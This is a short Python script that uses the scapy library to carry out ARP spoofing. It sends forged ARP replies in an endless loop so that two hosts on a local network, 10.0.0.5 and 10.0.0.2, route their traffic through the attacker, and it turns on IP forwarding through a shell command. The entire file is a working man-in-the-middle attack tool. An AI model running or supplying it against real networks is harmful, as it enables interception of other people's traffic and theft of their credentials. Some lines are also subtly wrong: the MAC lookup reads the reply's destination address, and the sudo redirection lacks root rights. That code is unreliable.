#! /bin/python3

import time

import scapy.all as scapy
import subprocess


def get_mac(target_ip):
    # (Wikipedia) in an arp request, the hwdst field is ignored;
    # therefore, we need to create an ether layer to carry the broadcast link-layer address
    arp_request = scapy.ARP(pdst=target_ip)
    ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast_packet = ether / arp_request

    # srp returns 2 lists
    # the first one contains pairs of request-response
    # the second one contains requests that are not responded

    # this function gets MAC address of one specific internet address;
    # therefore, there is only at max 1 answer in the response
    answer = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    if answer:
        # get the response from the first and the only pair from the answer list
        return answer[0][1].hwdst
    else:
        return None


def spoof(target_ip, spoofed_ip):
    print(f"[+] Spoofing {target_ip} ...")
    hwdst = get_mac(target_ip)
    if hwdst is None:
        print(f"[-] No target has the {target_ip} was found!")
    else:
        packet = scapy.ARP(op=2,
                           pdst=target_ip,
                           hwdst=hwdst,
                           psrc=spoofed_ip)

        scapy.send(packet, verbose=False)
        print("[+] Spoof successfully!")


subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
while True:
    spoof("10.0.0.5", "10.0.0.2")
    spoof("10.0.0.2", "10.0.0.5")
    time.sleep(2)
